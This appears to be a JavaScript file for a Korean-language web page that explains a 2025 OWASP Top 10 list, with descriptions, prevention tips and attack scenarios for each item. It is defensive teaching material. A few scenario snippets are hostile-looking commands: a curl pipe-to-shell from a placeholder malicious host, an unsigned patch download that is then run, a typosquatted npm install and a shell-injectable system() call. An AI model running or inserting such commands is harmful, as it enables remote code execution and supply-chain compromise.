const top10Items = [
  {
    rank: 1,
    code: 'A01:2025',
    title: 'Broken Access Control',
    heading: 'Broken Access Control',
    intro:
      '사용자가 허용된 권한을 벗어나 다른 사용자의 데이터나 관리자 기능에 접근할 수 있는 위험입니다.',
    risks: ['무단 접근', '권한 우회', '데이터 노출'],
    cwe: ['CWE-200', 'CWE-284', 'CWE-285'],
    core: ['기본 거부 정책', '서버 측 권한 검증', '경계 테스트 수행'],
    description: [
      'Broken Access Control은 애플리케이션의 접근 제어가 일관되지 않거나 누락되어 발생합니다.',
      '정상 사용자는 접근해서는 안 되는 기능이나 리소스에 도달할 수 있고, 그 결과 민감한 정보가 노출될 수 있습니다.',
    ],
    prevention: [
      '모든 요청에 대해 서버 측에서 권한을 검사합니다.',
      '기본적으로 거부하고 명시적으로 허용된 경우만 접근을 허용합니다.',
      '권한 검사를 중앙에서 관리하여 일관성을 유지합니다.',
      '직접 객체 참조(Direct Object Reference)를 피하고 토큰 기반 접근 제어를 적용합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: URL 조작으로 다른 계정 조회',
        text: '사용자가 요청한 주문 ID를 검증하지 않고 그대로 사용하면 다른 사용자의 주문 정보를 조회할 수 있습니다.',
        code: 'GET /orders/12345 → GET /orders/12346',
      },
      {
        title: '시나리오 #2: 관리자 API 권한 검사 누락',
        text: '관리자 전용 API가 사용자 토큰만으로 호출 가능하면 일반 사용자가 관리자 작업을 수행할 수 있습니다.',
        code: 'POST /admin/deleteUser?userId=789',
      },
    ],
  },
  {
    rank: 2,
    code: 'A02:2025',
    title: 'Security Misconfiguration',
    heading: 'Security Misconfiguration',
    intro:
      '서버, 프레임워크, 클라우드 또는 애플리케이션이 안전하지 않게 구성되어 공격에 노출되는 상황입니다.',
    risks: ['디버그 정보 노출', '기본 인증 정보', '불필요한 서비스 활성화'],
    cwe: ['CWE-16', 'CWE-200', 'CWE-933'],
    core: ['안전한 기본 구성', '불필요 요소 제거', '정기적 구성 검토'],
    description: [
      'Security Misconfiguration은 구성 단계에서 보안 설정을 누락하거나 기본값을 그대로 사용해서 발생합니다.',
      '취약한 구성은 공격자가 시스템에 쉽게 접근하거나 민감 정보를 획득할 수 있는 출구가 됩니다.',
    ],
    prevention: [
      '모든 환경에 대해 안전한 기본 구성을 적용합니다.',
      '디버그 모드, 관리자 콘솔, 샘플 애플리케이션을 제거합니다.',
      '구성 변경 사항을 문서화하고 자동화된 검증을 수행합니다.',
      '클라우드 권한과 네트워크 접근 제어를 최소 권한 원칙으로 설정합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 디버그 정보가 노출된 테스트 환경',
        text: '디버그 모드가 활성화된 상태에서 애플리케이션 오류가 발생하면 상세한 스택 트레이스가 외부에 노출됩니다.',
        code: 'HTTP 500 - Stack trace: NullPointerException at /user/login',
      },
      {
        title: '시나리오 #2: 공개된 관리자 인터페이스',
        text: '관리자 페이지에 대한 접근 제어가 없으면 누구나 관리자 기능을 호출할 수 있습니다.',
        code: 'GET /admin/dashboard',
      },
    ],
  },
  {
    rank: 3,
    code: 'A03:2025',
    title: 'Software Supply Chain Failures',
    heading: 'Software Supply Chain Failures',
    intro:
      '서드파티 라이브러리, 빌드 파이프라인, 배포 아티팩트에서 발생하는 공급망 취약점입니다.',
    risks: ['패키지 변조', '빌드 파이프라인 침해', '악성 종속성'],
    cwe: ['CWE-829', 'CWE-494', 'CWE-912'],
    core: ['구성 요소 무결성 검증', '서명된 아티팩트', '파이프라인 보안'],
    description: [
      'Software Supply Chain Failures는 애플리케이션에 포함된 외부 구성 요소나 빌드/배포 체인이 공격받을 때 발생합니다.',
      '공급망이 손상되면 악성 코드가 정상 소프트웨어에 은밀히 포함되어 배포될 수 있습니다.',
    ],
    prevention: [
      '모든 외부 종속성의 출처를 검증하고 신뢰할 수 있는 저장소만 사용합니다.',
      '빌드 아티팩트에 디지털 서명을 적용하고 서명 무결성을 확인합니다.',
      'CI/CD 파이프라인에 대한 접근 제어와 비밀 관리 정책을 강화합니다.',
      '의존성 및 이미지에 대해 정기적으로 취약점 스캔을 수행합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 악성 패키지 버전 설치',
        text: '공격자가 인기 있는 라이브러리의 이름과 유사한 패키지를 업로드하면 개발자가 실수로 악성 패키지를 설치할 수 있습니다.',
        code: 'npm install expresss',
      },
      {
        title: '시나리오 #2: CI 비밀 유출로 인한 코드 변조',
        text: '빌드 서버의 자격 증명이 유출되면 빌드 프로세스에 악성 코드를 주입할 수 있습니다.',
        code: 'bash build.sh && curl https://malicious.example.com/payload.sh | sh',
      },
    ],
  },
  {
    rank: 4,
    code: 'A04:2025',
    title: 'Cryptographic Failures',
    heading: 'Cryptographic Failures',
    intro:
      '암호화와 키 관리가 잘못된 경우 민감한 데이터가 노출되거나 변조될 수 있습니다.',
    risks: ['평문 저장', '약한 암호화', '키 노출'],
    cwe: ['CWE-327', 'CWE-311', 'CWE-319'],
    core: ['강력한 암호화 사용', '키 수명 주기 관리', 'TLS 강제 적용'],
    description: [
      'Cryptographic Failures는 암호화 알고리즘, 프로토콜, 키 관리가 부적절할 때 발생합니다.',
      '적절한 암호화가 없으면 기밀 데이터가 전송 중에 가로채이거나 저장된 상태에서 탈취될 수 있습니다.',
    ],
    prevention: [
      '모든 민감한 데이터 전송과 저장에 적절한 암호화를 적용합니다.',
      '구식 암호화 알고리즘과 키를 사용하지 않습니다.',
      '키와 인증서를 안전하게 저장하고 정기적으로 교체합니다.',
      'TLS 및 인증된 암호화(AEAD)를 사용합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: TLS 없이 로그인 페이지 전송',
        text: '로그인 폼이 HTTPS가 아닌 HTTP로 전송되면 공격자가 자격 증명을 가로챌 수 있습니다.',
        code: 'POST http://example.com/login',
      },
      {
        title: '시나리오 #2: 약한 해시로 비밀번호 저장',
        text: 'SHA-1과 같은 취약한 해시를 사용하면 비밀번호 파일이 쉽게 복원될 수 있습니다.',
        code: 'passwordHash = SHA1(password)',
      },
    ],
  },
  {
    rank: 5,
    code: 'A05:2025',
    title: 'Injection',
    heading: 'Injection',
    intro:
      '입력값을 적절히 필터링하지 않으면 공격자가 명령이나 쿼리를 삽입할 수 있습니다.',
    risks: ['SQL 주입', 'OS 명령 주입', '템플릿 주입'],
    cwe: ['CWE-89', 'CWE-77', 'CWE-20'],
    core: ['파라미터화된 쿼리', '입력 검증', '출력 이스케이프'],
    description: [
      'Injection은 사용자 입력이 코드, 쿼리, 또는 시스템 명령으로 해석될 때 발생합니다.',
      '이 취약점은 데이터베이스, 운영체제, 템플릿 엔진 등 다양한 영역에서 심각한 피해를 줍니다.',
    ],
    prevention: [
      'SQL과 명령어에 사용자 입력을 직접 연결하지 않습니다.',
      '파라미터화된 쿼리와 안전한 API를 사용합니다.',
      '입력과 출력을 적절하게 검증하고 이스케이프 처리합니다.',
      '템플릿이나 직렬화 데이터에 대한 사용자 제어를 제한합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 취약한 로그인 쿼리',
        text: '사용자 입력을 그대로 SQL 문자열에 삽입하면 공격자가 조건을 변경할 수 있습니다.',
        code: "SELECT * FROM users WHERE username = 'alice' AND password = 'secret'",
      },
      {
        title: '시나리오 #2: 파일 경로 인젝션',
        text: '파일 이름 검증 없이 명령어에 전달하면 공격자가 운영체제 명령을 실행할 수 있습니다.',
        code: 'system("cat /uploads/" + filename)',
      },
    ],
  },
  {
    rank: 6,
    code: 'A06:2025',
    title: 'Insecure Design',
    heading: 'Insecure Design',
    intro:
      '보안 요구사항을 설계 단계에서 충분히 반영하지 않으면 전체 시스템이 취약해집니다.',
    risks: ['비즈니스 로직 취약점', '위협 모델 부족', '불완전한 보안 검증'],
    cwe: ['CWE-50', 'CWE-312', 'CWE-693'],
    core: ['보안 설계 검토', '위협 모델링', '재사용 가능한 보안 패턴'],
    description: [
      'Insecure Design은 필요한 보안 통제가 설계 시점부터 반영되지 않은 결과입니다.',
      '이 취약점은 코드 수정만으로 해결하기 어렵고 설계 단계에서 보안 관점을 포함해야 합니다.',
    ],
    prevention: [
      '시스템 설계 단계에서 위협 모델링을 수행합니다.',
      '보안 기능과 실패 모드를 명시적으로 설계합니다.',
      '공통 보안 설계 패턴과 준수 기준을 재사용합니다.',
      '설계 검토를 위한 보안 전문가 참여를 보장합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 검증 없는 비즈니스 로직 흐름',
        text: '재고 감소와 결제가 동시에 처리되지 않으면 공격자가 주문을 중복 제출할 수 있습니다.',
        code: 'order.process() → payment.process()',
      },
      {
        title: '시나리오 #2: 취약한 권한 분리',
        text: '사용자와 관리자의 역할이 명확하지 않으면 일반 사용자도 관리자 기능을 실행할 수 있습니다.',
        code: 'if(user.role != "admin") { /* missing */ }',
      },
    ],
  },
  {
    rank: 7,
    code: 'A07:2025',
    title: 'Authentication Failures',
    heading: 'Authentication Failures',
    intro:
      '인증과 세션 관리가 약하면 계정 탈취나 비인가 접근이 발생할 수 있습니다.',
    risks: ['자격 증명 유출', '세션 탈취', '계정 열거'],
    cwe: ['CWE-287', 'CWE-300', 'CWE-521'],
    core: ['다중 인증', '안전한 세션 관리', '계정 보호'],
    description: [
      'Authentication Failures는 인증 설계나 구현이 부족할 때 발생합니다.',
      '약한 비밀번호 정책, 세션 토큰 노출, 자동화 공격에 취약한 인증 흐름이 원인입니다.',
    ],
    prevention: [
      '다중 요소 인증(MFA)을 도입합니다.',
      '세션 토큰을 안전하게 저장하고 전송합니다.',
      '계정 잠금, 비밀번호 재사용 방지, 비밀번호 검증을 강화합니다.',
      '인증 실패 메시지를 일관되게 구성하여 계정 열거를 방지합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 자격 증명 채우기 공격',
        text: '공격자가 유출된 사용자 이름과 비밀번호 조합을 자동으로 시도하여 계정을 탈취합니다.',
        code: 'POST /login {username: "alice", password: "P@ssw0rd"}',
      },
      {
        title: '시나리오 #2: URL에 세션 토큰 노출',
        text: '세션 ID를 쿼리 파라미터로 전달하면 링크를 공유할 때 토큰이 노출됩니다.',
        code: 'https://example.com/dashboard?sessionId=abcd1234',
      },
    ],
  },
  {
    rank: 8,
    code: 'A08:2025',
    title: 'Software or Data Integrity Failures',
    heading: 'Software or Data Integrity Failures',
    intro:
      '소프트웨어와 데이터가 무결성 검증 없이 처리되면 변조나 악성 코드 삽입에 취약합니다.',
    risks: ['업데이트 변조', '데이터 무결성 손상', '역직렬화 악용'],
    cwe: ['CWE-494', 'CWE-918', 'CWE-912'],
    core: ['디지털 서명 검증', '무결성 검사', '신뢰된 소스 사용'],
    description: [
      'Software or Data Integrity Failures는 시스템이 다운로드하거나 실행하는 소프트웨어와 데이터의 무결성을 확인하지 않을 때 발생합니다.',
      '이로 인해 악성 업데이트나 변조된 입력이 시스템에 침투할 수 있습니다.',
    ],
    prevention: [
      '소프트웨어 배포 아티팩트를 디지털 서명하고 검증합니다.',
      '내부 및 외부 데이터 입력에 대한 무결성 검사를 수행합니다.',
      '공급업체와 패키지 출처를 신뢰할 수 있는 저장소로 제한합니다.',
      '직렬화된 데이터를 수신할 때 허용된 클래스 목록을 사용합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 서명되지 않은 업데이트 설치',
        text: '업데이트 파일을 서명 검증 없이 설치하면 공격자가 악성 코드를 배포할 수 있습니다.',
        code: 'curl -O https://update.example.com/app.patch && sh app.patch',
      },
      {
        title: '시나리오 #2: 변조된 직렬화 데이터 처리',
        text: '직렬화된 입력을 그대로 역직렬화하면 공격자가 원격 코드 실행을 유발할 수 있습니다.',
        code: 'deserialize(userInput)',
      },
    ],
  },
  {
    rank: 9,
    code: 'A09:2025',
    title: 'Security Logging and Alerting Failures',
    heading: 'Security Logging and Alerting Failures',
    intro: '적절한 로깅과 알림이 없으면 침해를 탐지하거나 대응할 수 없습니다.',
    risks: ['침해 미감지', '사건 대응 지연', '감사 추적 부족'],
    cwe: ['CWE-301', 'CWE-778', 'CWE-778'],
    core: ['중앙 로깅', '이상 징후 알림', '감사 추적 유지'],
    description: [
      'Security Logging and Alerting Failures는 중요한 보안 이벤트가 기록되지 않거나 경고되지 않을 때 발생합니다.',
      '이러한 실패는 공격자가 장기간 탐지되지 않고 활동할 수 있는 환경을 제공합니다.',
    ],
    prevention: [
      '중요한 인증, 권한, 시스템 오류 이벤트를 모두 기록합니다.',
      '로그를 중앙에서 수집하고 이상 징후에 대해 알림을 설정합니다.',
      '로그를 안전하게 보관하고 무결성을 검증합니다.',
      '사건 대응 절차를 마련하고 정기적으로 테스트합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 무시된 로그인 실패',
        text: '로그인 실패가 기록되지 않으면 무차별 대입 공격이 오래 지속될 수 있습니다.',
        code: 'failed login count = 0',
      },
      {
        title: '시나리오 #2: 관리자 작업 알림 없음',
        text: '중요한 관리자 권한 변경이 기록되지 않으면 침입자가 증거를 지운 뒤에도 탐지하기 어렵습니다.',
        code: 'PATCH /users/123/role = "admin"',
      },
    ],
  },
  {
    rank: 10,
    code: 'A10:2025',
    title: 'Mishandling of Exceptional Conditions',
    heading: 'Mishandling of Exceptional Conditions',
    intro:
      '예외 상황을 안전하게 처리하지 않으면 정보 유출, 서비스 중단, 비정상 상태로 이어집니다.',
    risks: ['오류 정보 노출', '서비스 다운', '예기치 않은 동작'],
    cwe: ['CWE-248', 'CWE-755'],
    core: ['안전한 예외 처리', '일관된 오류 응답', '기본 안전 원칙'],
    description: [
      'Mishandling of Exceptional Conditions는 예외와 오류 상태를 올바르게 처리하지 않을 때 발생합니다.',
      '예외 정보가 외부에 노출되거나 오류 처리 도중 권한 검사가 우회될 수 있습니다.',
    ],
    prevention: [
      '예외를 포괄적으로 처리하고 속된 오류 메시지를 숨깁니다.',
      '오류 발생 시 최소 권한 원칙에 따라 기본 안전 상태로 복귀합니다.',
      '입력 값 검증을 강화하여 예외 발생 빈도를 줄입니다.',
      '장애와 예외를 기록하고 모니터링합니다.',
    ],
    scenarios: [
      {
        title: '시나리오 #1: 스택 트레이스 노출',
        text: '서버 오류가 사용자에게 자세한 스택 트레이스를 반환하면 내부 구조와 취약점을 노출할 수 있습니다.',
        code: 'HTTP 500 - NullReferenceException at /api/user',
      },
      {
        title: '시나리오 #2: 예외 처리 누락으로 권한 우회',
        text: '인증 예외가 처리되지 않아 비인가 사용자가 보호된 리소스에 접근할 수 있습니다.',
        code: 'if(token == null) throw Exception();',
      },
    ],
  },
];

const panelTitle = document.getElementById('panelTitle');
const panelIntro = document.getElementById('panelIntro');
const panelRisk = document.getElementById('panelRisk');
const panelCwe = document.getElementById('panelCwe');
const panelCore = document.getElementById('panelCore');
const panelDescription = document.getElementById('panelDescription');
const panelPrevention = document.getElementById('panelPrevention');
const panelScenarios = document.getElementById('panelScenarios');
const top10List = document.getElementById('top10List');
const badge = document.querySelector('.top10-badge');

function createTextBlock(lines) {
  return lines.map((line) => `<p>${line}</p>`).join('');
}

function renderScenarios(scenarios) {
  return scenarios
    .map((item) => {
      const codeBlock = item.code ? `<pre><code>${item.code}</code></pre>` : '';
      return `<div class="scenario-item"><strong>${item.title}</strong><p>${item.text}</p>${codeBlock}</div>`;
    })
    .join('');
}

function renderItem(index) {
  const item = top10Items[index];
  panelTitle.textContent = `${item.code} – ${item.title}`;
  panelIntro.textContent = item.intro;
  badge.textContent = `TOP ${item.rank}`;
  panelRisk.textContent = item.risks.join(' · ');
  panelCwe.textContent = item.cwe.join(', ');
  panelCore.textContent = item.core.join(' · ');
  panelDescription.innerHTML = createTextBlock(item.description);
  panelPrevention.innerHTML = item.prevention
    .map((line) => `<li>${line}</li>`)
    .join('');
  panelScenarios.innerHTML = renderScenarios(item.scenarios);

  document.querySelectorAll('.top10-nav-button').forEach((button) => {
    button.classList.toggle('active', Number(button.dataset.index) === index);
  });
}

function initList() {
  top10Items.forEach((item, index) => {
    const button = document.createElement('button');
    button.type = 'button';
    button.className = 'top10-nav-button';
    button.dataset.index = index;
    button.innerHTML = `<span>${item.rank}</span><strong>${item.heading}</strong><small>${item.code}</small>`;
    button.addEventListener('click', () => renderItem(index));
    top10List.appendChild(button);
  });
}

initList();
renderItem(0);
